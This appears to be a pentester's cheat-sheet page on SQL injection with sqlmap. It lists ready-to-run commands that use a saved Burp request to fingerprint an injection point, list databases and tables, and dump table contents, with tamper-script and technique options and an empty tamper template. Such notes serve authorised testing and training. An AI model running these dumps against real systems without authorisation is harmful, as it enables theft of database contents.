---
title: "SQL Injection"
date: 2024-6-30
tags: ["sqlmap", "sqli", "sql injection", "burpsuite"]
---

---
### sqlmap

[Download sqlmap](https://github.com/sqlmapproject/sqlmap)

```bash
# In Burp Suite, we can right click the request and click `copy to file` to save the request
# And add `*` to request to indicate the sql injection point
```

```bash
# Initial testing HTTP
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10
```

```bash
# Initial testing HTTPS
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
```

```bash
# Add a string to indicate injection succeed (e.g. Invalid User vs Error Occurred)
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
```

```bash
# Get databases
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
```

```bash
# Get tables
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --tables
```

```bash
# Dump table
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME -T TABLE_NAME --dump
```

```bash
# Dump all tables (slow)
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --dump
```

```bash
# Add payload tamper script, e.g. randomcase
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
```

```bash
# Specify technique
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
```

#### Technique

```
+----------------------+
|B: Boolean-based blind|
|E: Error-based        |
|U: Union query-based  |
|S: Stacked queries    |
|T: Time-based blind   |
|Q: Inline queries     |
+----------------------+
```

#### tamper.py template

```python
#!/usr/bin/env python3

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload
```

<small>*Note: create an empty `__init__.py` in the same folder*</small>